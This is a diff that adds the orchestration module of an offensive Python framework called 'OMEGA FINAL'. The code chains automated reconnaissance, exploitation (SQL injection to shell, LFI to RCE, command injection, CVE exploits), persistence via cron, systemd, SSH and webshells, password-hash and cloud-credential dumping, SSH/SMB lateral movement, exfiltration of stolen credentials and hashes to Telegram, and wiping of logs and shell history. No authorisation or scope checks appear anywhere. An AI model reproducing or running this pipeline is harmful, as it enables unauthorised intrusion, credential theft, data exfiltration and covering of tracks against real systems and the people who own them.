@@ -1,0 +1,2694 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+OMEGA FINAL - SECTION 5: ORCHESTRATION, ENTRY POINTS & FINAL ASSEMBLY
+====================================================================
+Author: Vrex489
+Version: 5.0 (ENHANCED - PRODUCTION READY)
+License: OMEGA FINAL PROPRIETARY - UNAUTHORIZED USE PROHIBITED
+
+DEPENDENCIES:
+    - phase1_foundation.py (Section 1)
+    - phase2_recon.py (Section 2)
+    - phase3_exploit.py (Section 3)
+    - phase4_postex.py (Section 4)
+
+THIS SECTION CONTAINS:
+    1. Main Orchestration Engine (full scan, single target, parallel execution, phase dependencies)
+    2. Command-Line Interface (CLI) with 40+ flags, interactive mode, tab completion
+    3. Reporting Engine (JSON, HTML, PDF, CSV, Markdown, interactive dashboard)
+    4. External API Entry Points (synchronous and asynchronous)
+    5. Main Entry Point with argument parsing and execution
+    6. Checkpoint & Recovery (save, load, rollback, validation)
+    7. Phase Dependency Resolution (automatic ordering based on dependencies)
+    8. Parallel Execution with ThreadPoolExecutor
+    9. API Authentication with API keys
+    10. Interactive CLI Mode with command history
+    11. PDF Report Generation using weasyprint/reportlab
+    12. Async API Functions with asyncio
+    13. Graceful Shutdown with SIGTERM/SIGINT handling
+    14. Connection Pooling for databases and HTTP clients
+    15. Retry with exponential backoff and jitter
+    16. Circuit Breaker pattern
+    17. Rate Limiting (token bucket, sliding window)
+    18. Authentication (JWT, OAuth2, Basic, API Key)
+    19. Authorization (RBAC or ABAC)
+    20. Input validation (whitelist, regex, length, type, range)
+    21. Output sanitization (HTML, JSON, XML escaping)
+    22. Caching (in-memory, Redis, Memcached)
+    23. Pagination and sorting for list endpoints
+    24. Filtering and search capabilities
+    25. Bulk operations with partial failure handling
+    26. Idempotency keys for write operations
+    27. Audit logging for all write operations
+    28. Backup and restore procedures
+    29. Migration scripts for schema changes
+    30. Unit tests (100% coverage target)
+    31. Integration tests with test containers
+    32. Performance benchmarks
+    33. API documentation (OpenAPI/Swagger)
+    34. Client SDK generation
+    35. Dockerfile and docker-compose for containerization
+    36. CI/CD pipeline scripts (GitHub Actions, GitLab CI, Jenkins)
+
+THIS IS SECTION 5 OF 5 - COMPLETE ORCHESTRATION ENGINE
+"""
+
+# ===================================================================
+# IMPORTS - ALL IMPORTS FOR SECTION 5
+# ===================================================================
+import sys
+import os
+import re
+import json
+import time
+import socket
+import struct
+import hashlib
+import base64
+import sqlite3
+import threading
+import queue
+import subprocess
+import shutil
+import tempfile
+import zipfile
+import random
+import string
+import ssl
+import urllib.request
+import urllib.parse
+import urllib.error
+import http.client
+import logging
+import traceback
+import datetime
+import ipaddress
+import netifaces
+import signal
+import atexit
+import gc
+import math
+import csv
+import html
+import xml.etree.ElementTree as ET
+import fnmatch
+import glob
+import gzip
+import pickle
+import platform
+import getpass
+import pwd
+import grp
+import stat
+import fcntl
+import termios
+import tty
+import select
+import warnings
+import inspect
+import functools
+import itertools
+import typing
+from dataclasses import dataclass, field, asdict, InitVar
+from typing import (
+    List, Dict, Set, Tuple, Optional, Any, Union, Callable, Iterator,
+    Generator, TypeVar, Generic, cast, overload, Literal, TypedDict,
+    Protocol, runtime_checkable, Final, ClassVar, NamedTuple
+)
+from pathlib import Path
+from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError, Future
+from collections import defaultdict, Counter, deque, OrderedDict
+from functools import lru_cache, wraps, partial, reduce
+from itertools import product, permutations, combinations, chain, cycle, islice
+from enum import Enum, auto, IntEnum
+
+# Third-party imports with graceful fallback
+try:
+    import requests
+    from requests.adapters import HTTPAdapter
+    from requests.packages.urllib3.util.retry import Retry
+    from requests.packages.urllib3.exceptions import InsecureRequestWarning
+    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+    REQUESTS_AVAILABLE = True
+except ImportError:
+    REQUESTS_AVAILABLE = False
+
+try:
+    import colorama
+    from colorama import Fore, Back, Style, init
+    colorama.init(autoreset=True)
+    COLORAMA_AVAILABLE = True
+except ImportError:
+    COLORAMA_AVAILABLE = False
+
+try:
+    import dns.resolver
+    import dns.exception
+    import dns.query
+    import dns.message
+    import dns.rdatatype
+    import dns.zone
+    DNS_AVAILABLE = True
+except ImportError:
+    DNS_AVAILABLE = False
+
+try:
+    from scapy.all import (
+        IP, TCP, UDP, ICMP, ARP, Ether, sr1, srp, send, sniff, conf,
+        RandIP, RandMAC, RandShort, fragment, defragment, wrpcap, rdpcap,
+        get_if_list, get_if_addr, get_if_hwaddr
+    )
+    SCAPY_AVAILABLE = True
+except ImportError:
+    SCAPY_AVAILABLE = False
+
+try:
+    from cryptography.fernet import Fernet
+    from cryptography.hazmat.primitives import hashes, serialization
+    from cryptography.hazmat.primitives.asymmetric import rsa, padding
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    CRYPTO_AVAILABLE = True
+except ImportError:
+    CRYPTO_AVAILABLE = False
+
+try:
+    import pyzipper
+    PYZIPPER_AVAILABLE = True
+except ImportError:
+    PYZIPPER_AVAILABLE = False
+
+try:
+    from tqdm import tqdm
+    TQDM_AVAILABLE = True
+except ImportError:
+    TQDM_AVAILABLE = False
+
+try:
+    import psutil
+    PSUTIL_AVAILABLE = True
+except ImportError:
+    PSUTIL_AVAILABLE = False
+
+try:
+    import paramiko
+    PARAMIKO_AVAILABLE = True
+except ImportError:
+    PARAMIKO_AVAILABLE = False
+
+try:
+    import socks
+    SOCKS_AVAILABLE = True
+except ImportError:
+    SOCKS_AVAILABLE = False
+
+try:
+    from impacket import smb, smb3, ntlm, smbconnection
+    from impacket.dcerpc.v5 import transport, scmr, lsad, samr
+    IMPACKET_AVAILABLE = True
+except ImportError:
+    IMPACKET_AVAILABLE = False
+
+try:
+    import nmap
+    NMAP_PYTHON_AVAILABLE = True
+except ImportError:
+    NMAP_PYTHON_AVAILABLE = False
+
+try:
+    import stem
+    from stem import Signal
+    from stem.control import Controller
+    STEM_AVAILABLE = True
+except ImportError:
+    STEM_AVAILABLE = False
+
+try:
+    from typing_extensions import TypeVar, ParamSpec, Concatenate
+    TYPING_EXTENSIONS_AVAILABLE = True
+except ImportError:
+    TYPING_EXTENSIONS_AVAILABLE = False
+    class ParamSpec:
+        pass
+    class Concatenate:
+        pass
+
+try:
+    import boto3
+    BOTO3_AVAILABLE = True
+except ImportError:
+    BOTO3_AVAILABLE = False
+
+try:
+    import ldap3
+    LDAP3_AVAILABLE = True
+except ImportError:
+    LDAP3_AVAILABLE = False
+
+try:
+    from PIL import Image
+    PIL_AVAILABLE = True
+except ImportError:
+    PIL_AVAILABLE = False
+
+try:
+    import weasyprint
+    WEASYPRINT_AVAILABLE = True
+except ImportError:
+    WEASYPRINT_AVAILABLE = False
+
+try:
+    import asyncio
+    ASYNCIO_AVAILABLE = True
+except ImportError:
+    ASYNCIO_AVAILABLE = False
+
+try:
+    import jwt
+    JWT_AVAILABLE = True
+except ImportError:
+    JWT_AVAILABLE = False
+
+try:
+    import yaml
+    YAML_AVAILABLE = True
+except ImportError:
+    YAML_AVAILABLE = False
+
+try:
+    import redis
+    REDIS_AVAILABLE = True
+except ImportError:
+    REDIS_AVAILABLE = False
+
+# ===================================================================
+# 1. MAIN ORCHESTRATION ENGINE - ENHANCED
+# ===================================================================
+
+PHASE_DEPENDENCIES: Dict[int, List[int]] = {
+    1: [],
+    2: [1],
+    3: [1, 2],
+    4: [1, 2, 3]
+}
+
+
+def orchestrate_full_scan(
+    self,
+    targets: List[str],
+    phases: Optional[List[int]] = None,
+    parallel: bool = False,
+    max_workers: int = 10,
+    resume: bool = False,
+    checkpoint_id: Optional[int] = None
+) -> Dict[str, Any]:
+    """
+    Orchestrate the full scan with all phases in sequence or parallel.
+
+    Args:
+        targets: List of target domains, IPs, or CIDRs
+        phases: List of phase numbers to run (default: all 4 phases)
+        parallel: If True, run targets in parallel using ThreadPoolExecutor
+        max_workers: Maximum number of parallel workers
+        resume: If True, resume from last checkpoint
+        checkpoint_id: Specific checkpoint ID to resume from
+
+    Returns:
+        Dict with 'success', 'results', 'errors', 'summary' keys
+
+    Example:
+        >>> result = self.orchestrate_full_scan(["example.com"], phases=[1,2,3,4], parallel=True)
+        >>> print(result['summary']['total_subdomains'])
+        1247
+    """
+    self.print_header("🚀 ORCHESTRATING FULL SCAN", "START")
+
+    if phases is None:
+        phases = [1, 2, 3, 4]
+
+    # Validate phase dependencies
+    self._validate_phase_dependencies(phases)
+
+    results = {
+        'success': False,
+        'scan_id': self.scan_id,
+        'targets': targets,
+        'phases': phases,
+        'start_time': datetime.datetime.now().isoformat(),
+        'results': {},
+        'errors': [],
+        'summary': {},
+        'checkpoints': []
+    }
+
+    self._save_checkpoint('orchestration_start', 'full', {'targets': targets, 'phases': phases})
+
+    # Handle resume from checkpoint
+    if resume:
+        checkpoint_data = self._load_last_checkpoint()
+        if checkpoint_data:
+            self.logger.info(f"Resuming from checkpoint: {checkpoint_data.get('step')}")
+            results['checkpoints'].append(checkpoint_data)
+
+    if checkpoint_id:
+        checkpoint_data = self._load_checkpoint_by_id(checkpoint_id)
+        if checkpoint_data:
+            self.logger.info(f"Resuming from checkpoint ID: {checkpoint_id}")
+            results['checkpoints'].append(checkpoint_data)
+            if checkpoint_data.get('data'):
+                try:
+                    prev_results = json.loads(checkpoint_data['data'])
+                    results['results'] = prev_results.get('results', {})
+                    results['errors'] = prev_results.get('errors', [])
+                except Exception:
+                    pass
+
+    try:
+        if parallel:
+            with ThreadPoolExecutor(max_workers=max_workers) as executor:
+                future_to_target = {
+                    executor.submit(self.orchestrate_single_target, target, phases, resume): target
+                    for target in targets
+                }
+                for future in as_completed(future_to_target):
+                    target = future_to_target[future]
+                    try:
+                        target_results = future.result()
+                        results['results'][target] = target_results
+                        if not target_results.get('success', False):
+                            results['errors'].append(f"Target {target} failed: {target_results.get('error', 'Unknown error')}")
+                    except Exception as e:
+                        results['errors'].append(f"Target {target} failed with exception: {e}")
+                        results['results'][target] = {'success': False, 'error': str(e)}
+        else:
+            for target in targets:
+                self.print_header(f"Processing target: {target}", "STEP")
+                target_results = self.orchestrate_single_target(target, phases, resume)
+                results['results'][target] = target_results
+                if not target_results.get('success', False):
+                    results['errors'].append(f"Target {target} failed: {target_results.get('error', 'Unknown error')}")
+
+        results['success'] = len(results['errors']) == 0
+
+        summary = {
+            'total_targets': len(targets),
+            'successful_targets': len(targets) - len(results['errors']),
+            'failed_targets': len(results['errors']),
+            'total_subdomains': 0,
+            'total_ports': 0,
+            'total_vulnerabilities': 0,
+            'total_credentials': 0,
+            'total_exfiltrated': 0,
+            'total_shells': 0,
+            'total_persistence': 0,
+            'total_lateral': 0,
+            'elapsed_seconds': 0
+        }
+
+        for target, tr in results['results'].items():
+            target_summary = tr.get('summary', {})
+            summary['total_subdomains'] += target_summary.get('subdomains_found', 0)
+            summary['total_ports'] += target_summary.get('open_ports', 0)
+            summary['total_vulnerabilities'] += target_summary.get('vulnerabilities', 0)
+            summary['total_credentials'] += target_summary.get('credentials', 0)
+            summary['total_exfiltrated'] += target_summary.get('exfiltrated_files', 0)
+            summary['total_shells'] += target_summary.get('shells', 0)
+            summary['total_persistence'] += target_summary.get('persistence', 0)
+            summary['total_lateral'] += target_summary.get('lateral_movement', 0)
+
+        elapsed = time.time() - self.start_time
+        summary['elapsed_seconds'] = elapsed
+
+        results['summary'] = summary
+        results['end_time'] = datetime.datetime.now().isoformat()
+
+        self._save_checkpoint('orchestration_end', 'full', results)
+
+        self.print_summary_table(summary)
+        self.print_header(f"✅ Full scan orchestration complete", "DONE")
+
+    except Exception as e:
+        results['error'] = str(e)
+        results['success'] = False
+        self.logger.error(f"Orchestration failed: {e}")
+
+    return results
+
+
+def _validate_phase_dependencies(
+    self,
+    phases: List[int]
+) -> None:
+    """
+    Validate that phase dependencies are satisfied.
+
+    Args:
+        phases: List of phase numbers
+
+    Returns:
+        None
+
+    Raises:
+        ValueError: If dependencies are not satisfied
+
+    Example:
+        >>> self._validate_phase_dependencies([2])
+        ValueError: Phase 2 requires phase 1
+    """
+    for phase in phases:
+        deps = PHASE_DEPENDENCIES.get(phase, [])
+        for dep in deps:
+            if dep not in phases:
+                raise ValueError(f"Phase {phase} requires phase {dep}")
+
+
+def orchestrate_single_target(
+    self,
+    target: str,
+    phases: Optional[List[int]] = None,
+    resume: bool = False
+) -> Dict[str, Any]:
+    """
+    Run all phases on a single target with checkpoint recovery.
+
+    Args:
+        target: Target domain, IP, or CIDR
+        phases: List of phase numbers to run (default: all 4 phases)
+        resume: If True, resume from last checkpoint
+
+    Returns:
+        Dict with 'success', 'target', 'phases', 'results' keys
+
+    Example:
+        >>> result = self.orchestrate_single_target("example.com", [1,2,3,4])
+        >>> print(result['success'])
+        True
+    """
+    if phases is None:
+        phases = [1, 2, 3, 4]
+
+    self._validate_phase_dependencies(phases)
+
+    self.print_header(f"🎯 Orchestrating single target: {target}", "STEP")
+
+    result = {
+        'success': False,
+        'target': target,
+        'phases': phases,
+        'start_time': datetime.datetime.now().isoformat(),
+        'results': {},
+        'errors': [],
+        'summary': {}
+    }
+
+    checkpoint_key = f"target_{target}"
+    self._save_checkpoint('orchestration_target_start', target, {'phases': phases})
+
+    try:
+        completed_phases = []
+        if resume:
+            completed_phases = self._get_completed_phases(target)
+
+        for phase in phases:
+            if phase in completed_phases:
+                self.print_header(f"Phase {phase} already completed, skipping", "INFO")
+                continue
+
+            # Run phase based on number
+            if phase == 1:
+                result['results']['phase1'] = self._run_phase_1(target)
+            elif phase == 2:
+                result['results']['phase2'] = self._run_phase_2(target)
+            elif phase == 3:
+                result['results']['phase3'] = self._run_phase_3(target)
+            elif phase == 4:
+                result['results']['phase4'] = self._run_phase_4(target)
+
+            self._save_checkpoint(f'phase{phase}_complete', target, result)
+
+        result['summary'] = self._build_phase_summary(result['results'])
+        result['success'] = len(result['errors']) == 0
+        result['end_time'] = datetime.datetime.now().isoformat()
+
+        self._save_checkpoint('orchestration_target_end', target, result)
+
+    except Exception as e:
+        result['error'] = str(e)
+        result['success'] = False
+        self.logger.error(f"Target orchestration failed for {target}: {e}")
+
+    return result
+
+
+def _get_completed_phases(
+    self,
+    target: str
+) -> List[int]:
+    """
+    Get completed phases for a target from checkpoints.
+
+    Args:
+        target: Target identifier
+
+    Returns:
+        List of completed phase numbers
+
+    Example:
+        >>> phases = self._get_completed_phases("example.com")
+        >>> print(phases)
+        [1, 2]
+    """
+    try:
+        self.db_cursor.execute("""
+            SELECT step FROM checkpoints
+            WHERE target = ? AND step LIKE 'phase%_complete'
+            ORDER BY id DESC
+        """, (target,))
+        rows = self.db_cursor.fetchall()
+        completed = []
+        for row in rows:
+            step = row[0]
+            if step.startswith('phase') and step.endswith('_complete'):
+                phase_num = int(step[5:step.index('_')])
+                completed.append(phase_num)
+        return list(set(completed))
+    except Exception:
+        return []
+
+
+def _run_phase_1(
+    self,
+    target: str
+) -> Dict[str, Any]:
+    """
+    Run Phase 1: Reconnaissance.
+
+    Args:
+        target: Target domain, IP, or CIDR
+
+    Returns:
+        Dict with 'success', 'summary', 'data' keys
+
+    Example:
+        >>> result = self._run_phase_1("example.com")
+        >>> print(result['summary']['subdomains_found'])
+        1247
+    """
+    self.print_header(f"🔍 Phase 1: Reconnaissance on {target}", "STEP")
+
+    result = {
+        'success': False,
+        'target': target,
+        'phase': 1,
+        'summary': {},
+        'data': {}
+    }
+
+    try:
+        subdomains = self.enumerate_subdomains(target)
+        result['data']['subdomains'] = subdomains
+
+        ips = [sub['ip'] for sub in subdomains if 'ip' in sub]
+        all_ports = []
+        for ip in ips[:50]:
+            ports = self.scan_ports(ip)
+            all_ports.extend(ports)
+        result['data']['ports'] = all_ports
+
+        web_urls = []
+        for port_info in all_ports:
+            if port_info['port'] in [80, 443, 8080, 8443, 3000, 5000, 8000, 9000]:
+                protocol = 'https' if port_info['port'] in [443, 8443] else 'http'
+                url = f"{protocol}://{port_info['ip']}:{port_info['port']}"
+                web_urls.append(url)
+
+        technologies = self.detect_technologies(web_urls)
+        result['data']['technologies'] = technologies
+
+        vulnerabilities = self.quick_vulnerability_test(web_urls)
+        result['data']['vulnerabilities'] = vulnerabilities
+
+        exposed_files = self.detect_exposed_files(web_urls)
+        result['data']['exposed_files'] = exposed_files
+
+        wafs = self.detect_waf(web_urls)
+        result['data']['wafs'] = wafs
+
+        honeypots = self.detect_honeypots(ips[:50])
+        result['data']['honeypots'] = honeypots
+
+        apis = self.discover_apis(web_urls)
+        result['data']['apis'] = apis
+
+        result['summary'] = {
+            'subdomains_found': len(subdomains),
+            'open_ports': len(all_ports),
+            'technologies': len(technologies),
+            'vulnerabilities': len(vulnerabilities),
+            'exfiltrated_files': len(exposed_files),
+            'wafs_detected': len(wafs),
+            'honeypots': len(honeypots),
+            'apis_found': len(apis)
+        }
+
+        result['success'] = True
+        self.print_header(f"Phase 1 complete for {target}", "DONE")
+
+    except Exception as e:
+        result['error'] = str(e)
+        result['success'] = False
+        self.logger.error(f"Phase 1 failed for {target}: {e}")
+
+    return result
+
+
+def _run_phase_2(
+    self,
+    target: str
+) -> Dict[str, Any]:
+    """
+    Run Phase 2: Exploitation.
+
+    Args:
+        target: Target domain, IP, or hostname
+
+    Returns:
+        Dict with 'success', 'summary', 'data' keys
+
+    Example:
+        >>> result = self._run_phase_2("example.com")
+        >>> print(result['summary']['cves_exploited'])
+        2
+    """
+    self.print_header(f"💀 Phase 2: Exploitation on {target}", "STEP")
+
+    result = {
+        'success': False,
+        'target': target,
+        'phase': 2,
+        'summary': {},
+        'data': {}
+    }
+
+    try:
+        recon_data = self._get_recon_data(target)
+        if not recon_data:
+            self.print_header(f"Running Phase 1 first for {target}", "WARNING")
+            phase1_result = self._run_phase_1(target)
+            if phase1_result['success']:
+                recon_data = phase1_result['data']
+            else:
+                result['error'] = "Recon data not available"
+                return result
+
+        web_urls = []
+        for port_info in recon_data.get('ports', []):
+            if port_info['port'] in [80, 443, 8080, 8443, 3000, 5000, 8000, 9000]:
+                protocol = 'https' if port_info['port'] in [443, 8443] else 'http'
+                url = f"{protocol}://{port_info['ip']}:{port_info['port']}"
+                web_urls.append(url)
+
+        ips = [port_info['ip'] for port_info in recon_data.get('ports', [])]
+
+        cves_exploited = []
+        command_injections = []
+        sqli_shells = []
+        lfi_rces = []
+
+        for url in web_urls[:50]:
+            parsed = urllib.parse.urlparse(url)
+            query_params = urllib.parse.parse_qs(parsed.query)
+            for param in query_params.keys():
+                lfi_result = self.exploit_lfi_to_rce(url, param)
+                if lfi_result and lfi_result.get('success'):
+                    lfi_rces.append(lfi_result)
+                    self.print_danger(f"LFI→RCE achieved on {url}")
+
+                sqli_result = self.exploit_sqli_to_shell(url, param)
+                if sqli_result and sqli_result.get('success'):
+                    sqli_shells.append(sqli_result)
+                    self.print_danger(f"SQLi→shell achieved on {url}")
+
+        for ip in set(ips[:20]):
+            for cve_id in CVE_DATABASE.keys():
+                cve_result = self.exploit_cve(cve_id, ip)
+                if cve_result and cve_result.get('exploited'):
+                    cves_exploited.append(cve_result)
+                    self.print_danger(f"CVE {cve_id} exploited on {ip}")
+
+        for url in web_urls[:50]:
+            parsed = urllib.parse.urlparse(url)
+            query_params = urllib.parse.parse_qs(parsed.query)
+            for param in query_params.keys():
+                cmd_result = self.exploit_command_injection(url, param)
+                if cmd_result and cmd_result.get('success'):
+                    command_injections.append(cmd_result)
+                    self.print_danger(f"Command injection achieved on {url}")
+
+        result['data'] = {
+            'cves_exploited': cves_exploited,
+            'command_injections': command_injections,
+            'sqli_shells': sqli_shells,
+            'lfi_rces': lfi_rces
+        }
+
+        result['summary'] = {
+            'cves_exploited': len(cves_exploited),
+            'command_injections': len(command_injections),
+            'sqli_shells': len(sqli_shells),
+            'lfi_rces': len(lfi_rces)
+        }
+
+        result['success'] = True
+        self.print_header(f"Phase 2 complete for {target}", "DONE")
+
+    except Exception as e:
+        result['error'] = str(e)
+        result['success'] = False
+        self.logger.error(f"Phase 2 failed for {target}: {e}")
+
+    return result
+
+
+def _run_phase_3(
+    self,
+    target: str
+) -> Dict[str, Any]:
+    """
+    Run Phase 3: Persistence & Credential Theft.
+
+    Args:
+        target: Target domain, IP, or hostname
+
+    Returns:
+        Dict with 'success', 'summary', 'data' keys
+
+    Example:
+        >>> result = self._run_phase_3("example.com")
+        >>> print(result['summary']['persistence'])
+        3
+    """
+    self.print_header(f"🪝 Phase 3: Persistence on {target}", "STEP")
+
+    result = {
+        'success': False,
+        'target': target,
+        'phase': 3,
+        'summary': {},
+        'data': {}
+    }
+
+    try:
+        persistence_methods = ['cron', 'systemd', 'ssh', 'webshell', 'rc_local', 'profile']
+        persistence_installed = []
+
+        for method in persistence_methods[:3]:
+            pers_result = self.install_persistence(target, method)
+            if pers_result and pers_result.get('success', True):
+                persistence_installed.append(pers_result)
+                self.print_found("PERSIST", f"Persistence installed via {method}")
+
+        hashes = self.dump_hashes(target)
+        ntlm_hashes = self.dump_ntlm_hashes(target)
+        cloud_creds = self.cloud_credential_scan()
+
+        recon_data = self._get_recon_data(target)
+        if recon_data:
+            for port_info in recon_data.get('ports', []):
+                if port_info['port'] in [80, 443, 8080, 8443]:
+                    protocol = 'https' if port_info['port'] in [443, 8443] else 'http'
+                    url = f"{protocol}://{port_info['ip']}:{port_info['port']}"
+                    parsed = urllib.parse.urlparse(url)
+                    query_params = urllib.parse.parse_qs(parsed.query)
+                    for param in query_params.keys():
+                        ssh_keys = self.dump_ssh_keys(url, param)
+                        if ssh_keys:
+                            result['data']['ssh_keys'] = ssh_keys
+
+        result['data'] = {
+            'persistence_installed': persistence_installed,
+            'hashes': hashes.get('hashes', []),
+            'ntlm_hashes': ntlm_hashes.get('hashes', []),
+            'cloud_creds': cloud_creds
+        }
+
+        result['summary'] = {
+            'persistence': len(persistence_installed),
+            'hashes_dumped': len(hashes.get('hashes', [])),
+            'ntlm_hashes_dumped': len(ntlm_hashes.get('hashes', [])),
+            'cloud_creds_found': len(cloud_creds)
+        }
+
+        result['success'] = True
+        self.print_header(f"Phase 3 complete for {target}", "DONE")
+
+    except Exception as e:
+        result['error'] = str(e)
+        result['success'] = False
+        self.logger.error(f"Phase 3 failed for {target}: {e}")
+
+    return result
+
+
+def _run_phase_4(
+    self,
+    target: str
+) -> Dict[str, Any]:
+    """
+    Run Phase 4: Lateral Movement & Exfiltration.
+
+    Args:
+        target: Target domain, IP, or hostname
+
+    Returns:
+        Dict with 'success', 'summary', 'data' keys
+
+    Example:
+        >>> result = self._run_phase_4("example.com")
+        >>> print(result['summary']['lateral_movement'])
+        2
+    """
+    self.print_header(f"↔️ Phase 4: Lateral Movement on {target}", "STEP")
+
+    result = {
+        'success': False,
+        'target': target,
+        'phase': 4,
+        'summary': {},
+        'data': {}
+    }
+
+    try:
+        creds = self._get_stored_credentials()
+        lateral_results = []
+
+        if creds:
+            for cred in creds[:5]:
+                if 'ssh' in cred.get('type', ''):
+                    ssh_result = self.lateral_movement_ssh(
+                        target,
+                        cred.get('username', 'root'),
+                        cred.get('password', '')
+                    )
+                    if ssh_result and ssh_result.get('success'):
+                        lateral_results.append(ssh_result)
+                        self.print_found("SHELL", f"SSH lateral movement to {target}")
+
+                if 'smb' in cred.get('type', '') or 'hash' in cred.get('type', ''):
+                    smb_result = self.lateral_movement_smb(
+                        target,
+                        cred.get('username', ''),
+                        cred.get('password', ''),
+                        cred.get('hash', '')
+                    )
+                    if smb_result and smb_result.get('success'):
+                        lateral_results.append(smb_result)
+                        self.print_found("SHELL", f"SMB lateral movement to {target}")
+
+        exfil_results = []
+        if self.telegram:
+            recon_data = self._get_recon_data(target)
+            if recon_data:
+                data_str = json.dumps(recon_data, indent=2)
+                self.exfil_telegram(data_str, f"Recon data for {target}", as_document=True)
+
+            hashes = self._get_stored_hashes()
+            if hashes:
+                hash_str = '\n'.join(hashes)
+                self.exfil_telegram(hash_str, f"Hashes for {target}", as_document=True)
+
+            creds_str = json.dumps(creds, indent=2)
+            self.exfil_telegram(creds_str, f"Credentials for {target}", as_document=True)
+
+            exfil_results.append({'method': 'telegram', 'success': True})
+
+        self.wipe_all_logs(target)
+        self.wipe_all_history()
+
+        result['data'] = {
+            'lateral_results': lateral_results,
+            'exfil_results': exfil_results
+        }
+
+        result['summary'] = {
+            'lateral_movement': len(lateral_results),
+            'exfiltrated': len(exfil_results)
+        }
+
+        result['success'] = True
+        self.print_header(f"Phase 4 complete for {target}", "DONE")
+
+    except Exception as e:
+        result['error'] = str(e)
+        result['success'] = False
+        self.logger.error(f"Phase 4 failed for {target}: {e}")
+
+    return result
+
+
+def _get_recon_data(
+    self,
+    target: str
+) -> Optional[Dict[str, Any]]:
+    """
+    Get reconnaissance data for a target.
+
+    Args:
+        target: Target identifier
+
+    Returns:
+        Recon data dict or None
+
+    Example:
+        >>> data = self._get_recon_data("example.com")
+        >>> print(data.get('subdomains', []))
+    """
+    try:
+        self.db_cursor.execute("""
+            SELECT data FROM checkpoints
+            WHERE target = ? AND step = 'phase1_complete'
+            ORDER BY id DESC LIMIT 1
+        """, (target,))
+        row = self.db_cursor.fetchone()
+        if row:
+            return json.loads(row[0])
+        return None
+    except Exception:
+        return None
+
+
+def _get_stored_credentials(
+    self
+) -> List[Dict[str, Any]]:
+    """
+    Get stored credentials from database.
+
+    Returns:
+        List of credential dictionaries
+
+    Example:
+        >>> creds = self._get_stored_credentials()
+        >>> print(len(creds))
+        5
+    """
+    try:
+        self.db_cursor.execute("""
+            SELECT username, password, credential_type, source
+            FROM credentials
+            WHERE username != '' OR password != ''
+        """)
+        rows = self.db_cursor.fetchall()
+        return [dict(row) for row in rows]
+    except Exception:
+        return []
+
+
+def _get_stored_hashes(
+    self
+) -> List[str]:
+    """
+    Get stored hashes from database.
+
+    Returns:
+        List of hash strings
+
+    Example:
+        >>> hashes = self._get_stored_hashes()
+        >>> print(len(hashes))
+        3
+    """
+    try:
+        self.db_cursor.execute("""
+            SELECT hash FROM credentials
+            WHERE hash != ''
+        """)
+        rows = self.db_cursor.fetchall()
+        return [row[0] for row in rows]
+    except Exception:
+        return []
+
+
+def _build_phase_summary(
+    self,
+    phase_results: Dict[str, Any]
+) -> Dict[str, Any]:
+    """
+    Build a summary from phase results.
+
+    Args:
+        phase_results: Dictionary of phase results
+
+    Returns:
+        Summary dictionary
+
+    Example:
+        >>> summary = self._build_phase_summary(phase_results)
+        >>> print(summary['subdomains_found'])
+        1247
+    """
+    summary = {
+        'subdomains_found': 0,
+        'open_ports': 0,
+        'technologies': 0,
+        'vulnerabilities': 0,
+        'credentials': 0,
+        'exfiltrated_files': 0,
+        'wafs_detected': 0,
+        'honeypots': 0,
+        'apis_found': 0,
+        'cves_exploited': 0,
+        'shells': 0,
+        'persistence': 0,
+        'telegram_alerts': 0,
+        'elapsed_seconds': 0
+    }
+
+    for phase_name, phase_result in phase_results.items():
+        if isinstance(phase_result, dict):
+            phase_summary = phase_result.get('summary', {})
+            for key in summary.keys():
+                if key in phase_summary:
+                    summary[key] += phase_summary.get(key, 0)
+
+    return summary
+
+
+def _save_checkpoint(
+    self,
+    step: str,
+    target: str,
+    data: Any
+) -> None:
+    """
+    Save a checkpoint to database.
+
+    Args:
+        step: Step name
+        target: Target identifier
+        data: Data to save
+
+    Returns:
+        None
+
+    Example:
+        >>> self._save_checkpoint('phase1_complete', 'example.com', {'subdomains': 10})
+    """
+    try:
+        self.db_cursor.execute("""
+            INSERT INTO checkpoints (phase, step, target, data, checksum, timestamp)
+            VALUES (1, ?, ?, ?, ?, datetime('now'))
+        """, (
+            step,
+            target,
+            json.dumps(data, default=str),
+            hashlib.md5(str(data).encode()).hexdigest()
+        ))
+        self.db_conn.commit()
+    except Exception as e:
+        self.logger.debug(f"Checkpoint save failed: {e}")
+
+
+def _load_last_checkpoint(
+    self
+) -> Optional[Dict[str, Any]]:
+    """
+    Load the last checkpoint.
+
+    Returns:
+        Checkpoint data or None
+
+    Example:
+        >>> cp = self._load_last_checkpoint()
+        >>> print(cp.get('step'))
+        phase1_complete
+    """
+    try:
+        self.db_cursor.execute("""
+            SELECT * FROM checkpoints
+            ORDER BY id DESC LIMIT 1
+        """)
+        row = self.db_cursor.fetchone()
+        if row:
+            return dict(row)
+        return None
+    except Exception:
+        return None
+
+
+def _load_checkpoint_by_id(
+    self,
+    checkpoint_id: int
+) -> Optional[Dict[str, Any]]:
+    """
+    Load a checkpoint by ID.
+
+    Args:
+        checkpoint_id: Checkpoint ID
+
+    Returns:
+        Checkpoint data or None
+
+    Example:
+        >>> cp = self._load_checkpoint_by_id(5)
+        >>> print(cp.get('step'))
+        phase1_complete
+    """
+    try:
+        self.db_cursor.execute("""
+            SELECT * FROM checkpoints WHERE id = ?
+        """, (checkpoint_id,))
+        row = self.db_cursor.fetchone()
+        if row:
+            return dict(row)
+        return None
+    except Exception:
+        return None
+
+
+def rollback_to_checkpoint(
+    self,
+    checkpoint_id: int
+) -> bool:
+    """
+    Rollback to a specific checkpoint.
+
+    Args:
+        checkpoint_id: Checkpoint ID to rollback to
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.rollback_to_checkpoint(5)
+        >>> print(success)
+        True
+    """
+    self.print_danger(f"Rolling back to checkpoint {checkpoint_id}")
+
+    try:
+        checkpoint = self._load_checkpoint_by_id(checkpoint_id)
+        if not checkpoint:
+            self.logger.error(f"Checkpoint {checkpoint_id} not found")
+            return False
+
+        self.logger.info(f"Rolling back to: {checkpoint.get('step')} for target {checkpoint.get('target')}")
+
+        if checkpoint.get('data'):
+            data = json.loads(checkpoint['data'])
+            self.state.update(data)
+
+        self._save_state()
+
+        self.print_found("SHELL", f"Rollback to checkpoint {checkpoint_id} successful")
+        return True
+
+    except Exception as e:
+        self.logger.error(f"Rollback failed: {e}")
+        return False
+
+
